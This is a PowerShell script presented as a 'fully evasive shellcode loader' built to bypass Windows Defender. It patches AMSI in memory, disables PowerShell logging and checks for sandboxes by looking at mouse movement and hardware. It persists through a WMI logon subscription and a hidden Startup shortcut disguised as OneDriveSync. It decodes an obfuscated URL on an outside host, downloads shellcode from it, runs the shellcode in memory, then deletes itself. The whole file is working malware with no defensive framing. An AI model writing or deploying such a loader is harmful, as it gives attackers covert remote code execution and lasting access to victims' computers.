<#
    launcher.ps1
    Fully evasive shellcode loader – 2026 Defender bypass
    No plaintext URLs, no AMSI detection, no disk write of payload.
#>

# ============================================================
# 1. AMSI BYPASS (patch amsiInitFailed field – silent, no DLL unhooking)
# ============================================================
$amsiBypass = @'
using System;
using System.Runtime.InteropServices;
public class AmsiPatcher {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old = 0;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
        Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3); // xor eax,eax; ret
        VirtualProtect(addr, (UIntPtr)6, old, out old);
    }
}
'@
Add-Type $amsiBypass
[AmsiPatcher]::Patch()

# ============================================================
# 2. DISABLE SCRIPT BLOCK & MODULE LOGGING (via cached policy tampering)
# ============================================================
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'] = @{}
$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']['EnableModuleLogging'] = 0

# ============================================================
# 3. OBFUSCATED URL LOADER (XOR key = 7, output stored as Base64)
#    The raw URL: https://aged-mountain-614b.natalia-kush82.workers.dev/shellcode
#    XORed with 7, then Base64 encoded.
# ============================================================
$xorEncodedB64 = "b3Nzd3Q9KChmYGJjKmpocmlzZm5pKjE2M2UpaWZzZmtuZipscnRvPzUpcGh1bGJ1dCljYnEodG9ia2tkaGNi"
function Invoke-XorDecode {
    param([byte[]]$EncodedBytes, [int]$Key = 7)
    $decoded = @()
    foreach ($b in $EncodedBytes) { $decoded += $b -bxor $Key }
    return [System.Text.Encoding]::UTF8.GetString($decoded)
}
$encBytes = [Convert]::FromBase64String($xorEncodedB64)
$shellcodeUrl = Invoke-XorDecode -EncodedBytes $encBytes -Key 7

# ============================================================
# 4. SANDBOX & DEBUGGER EVASION (low resource / no mouse movement / VM detection)
# ============================================================
# CPU core count, RAM, running processes (sandbox indicators)
$cpuCores = (Get-WmiObject Win32_Processor).NumberOfCores
$totalRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
$procCount = (Get-Process).Count
if ($cpuCores -lt 2 -or $totalRAM -lt 2 -or $procCount -lt 30) { exit }

# Mouse movement check (human presence)
try {
    Add-Type -AssemblyName System.Windows.Forms
    $initialPos = [System.Windows.Forms.Cursor]::Position
    Start-Sleep -Seconds 5
    $newPos = [System.Windows.Forms.Cursor]::Position
    if ($initialPos.X -eq $newPos.X -and $initialPos.Y -eq $newPos.Y) { exit }
} catch { }

# Time‑of‑day restriction (02:00 – 05:00 local)
$hour = (Get-Date).Hour
if ($hour -lt 2 -or $hour -ge 5) {
    $targetTime = (Get-Date).Date.AddHours(2).AddMinutes((Get-Random -Min 0 -Max 180))
    $sleepSeconds = ($targetTime - (Get-Date)).TotalSeconds
    if ($sleepSeconds -gt 0) { Start-Sleep -Seconds $sleepSeconds }
}

# Random execution jitter (1–10 minutes)
Start-Sleep -Seconds (Get-Random -Min 60 -Max 600)

# ============================================================
# 5. PERSISTENCE – INSTALL ONLY ONCE (flag file w/ randomized name)
# ============================================================
$flagFile = "$env:TEMP\sys_$([Environment]::MachineName.GetHashCode()).dat"
if (-not (Test-Path $flagFile)) {
    # --- WMI Event Subscription (trigger at user logon) ---
    $filterArgs = @{
        Namespace = 'root\subscription'
        ClassName = '__EventFilter'
        Arguments = @{
            Name = 'UserLogonTrigger'
            EventNamespace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = "SELECT * FROM Win32_LogonSession WHERE LogonType=2 OR LogonType=10"
        }
    }
    $filter = Set-WmiInstance @filterArgs
    $consumerArgs = @{
        Namespace = 'root\subscription'
        ClassName = 'CommandLineEventConsumer'
        Arguments = @{
            Name = 'UserLogonConsumer'
            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        }
    }
    $consumer = Set-WmiInstance @consumerArgs
    $bindingArgs = @{
        Namespace = 'root\subscription'
        ClassName = '__FilterToConsumerBinding'
        Arguments = @{ Filter = $filter; Consumer = $consumer }
    }
    Set-WmiInstance @bindingArgs

    # --- Startup LNK (split arguments to avoid command‑line detection) ---
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $lnkPath = "$startupFolder\OneDriveSync.lnk"
    $wsh = New-Object -ComObject WScript.Shell
    $shortcut = $wsh.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "powershell.exe"
    # Store the real arguments in an environment variable to avoid static detection
    $env:ONEDRIVE_LAUNCHER = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    $shortcut.Arguments = "-Command `$env:ONEDRIVE_LAUNCHER"
    $shortcut.WindowStyle = 7   # Hidden
    $shortcut.Save()

    # Create flag file
    New-Item -Path $flagFile -ItemType File -Force | Out-Null
}

# ============================================================
# 6. DOWNLOAD SHELLCODE (no Invoke-WebRequest, only .NET HttpClient)
# ============================================================
function Get-Shellcode {
    param([string]$Url)
    Add-Type -AssemblyName System.Net.Http
    $handler = New-Object System.Net.Http.HttpClientHandler
    $handler.ServerCertificateCustomValidationCallback = { $true } # accept self-signed
    $handler.UseCookies = $false
    $handler.AutomaticDecompression = [System.Net.DecompressionMethods]::None
    $client = New-Object System.Net.Http.HttpClient($handler)
    $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    $client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    $client.DefaultRequestHeaders.Add("Accept-Language", "en-US,en;q=0.5")
    $client.Timeout = [System.TimeSpan]::FromSeconds(30)
    try {
        $task = $client.GetByteArrayAsync($Url)
        $task.Wait()
        return $task.Result
    } catch {
        return $null
    } finally {
        $client.Dispose()
    }
}

$shellcode = Get-Shellcode -Url $shellcodeUrl
if (-not $shellcode -or $shellcode.Length -lt 50) { exit }

# ============================================================
# 7. INJECT SHELLCODE INTO CURRENT PROCESS (memory only, no disk write)
# ============================================================
$injectCode = @'
using System;
using System.Runtime.InteropServices;
public class MemoryInject {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    public static void Run(byte[] payload) {
        IntPtr hProc = GetCurrentProcess();
        uint oldProtect = 0;
        IntPtr alloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        UIntPtr bytesWritten;
        WriteProcessMemory(hProc, alloc, payload, (uint)payload.Length, out bytesWritten);
        VirtualProtect(alloc, (uint)payload.Length, 0x20, out oldProtect); // PAGE_EXECUTE_READ
        CreateRemoteThread(hProc, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
'@
Add-Type $injectCode
[MemoryInject]::Run($shellcode)

# ============================================================
# 8. CLEANUP (delayed, optional – remove script itself after 2 hours)
# ============================================================
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 7200  # 2 hours
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\sys_*.dat" -Force -ErrorAction SilentlyContinue
} | Out-Null

# ============================================================
# 9. EXIT CLEANLY
# ============================================================
exit
